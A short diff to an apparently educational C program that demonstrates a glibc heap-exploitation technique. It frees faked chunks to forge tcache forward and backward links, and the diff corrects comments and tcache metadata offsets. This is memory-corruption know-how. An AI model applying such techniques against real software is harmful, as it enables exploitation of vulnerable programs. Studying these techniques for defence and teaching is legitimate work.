@@ -166,7 +166,7 @@ int main(void) {
 	puts("");
 
 	printf("Free the faked 0x331 chunk @ %p\n", small_start-0x10);
-	free(small_start-0x10); // Create a fake FWD
+	free(small_start-0x10); // Create a fake BCK
 	puts("");
 	
 	puts("Finally, because of the meta-data created by free'ing the 0x331 chunk, we need to");
@@ -195,7 +195,7 @@ int main(void) {
 	puts("");
 	
 	printf("Free the faked 0x321 chunk @ %p\n", small_end-0x10);
-	free(small_end-0x10); // Create a fake BCK
+	free(small_end-0x10); // Create a fake FWD
 	puts("");
 	
 	puts("restore the original header of the small_end chunk by restoring the 0x91 header:");
@@ -240,13 +240,13 @@ int main(void) {
 	printf("\t\t%p <--> %p <--> %p\n", small_start-0x10, relative_chunk-0x10, small_end-0x10);
 	
 	printf("\t- 0x320 t-cache:\n");
-	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x390));
+	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x210));
 	printf("\t- 0x330 t-cache\n");
-	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x398));
+	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x218));
 	puts("");
 
 	puts("The fake chunk in the t-cache will look like the following:");
-	dump_memory(metadata+0x370, 4);
+	dump_memory(metadata+0x200, 4);
 	puts("");
 
 	puts("We can now observe that the 0x330 t-cache points to small_start and 0x320 t-cache points to ");
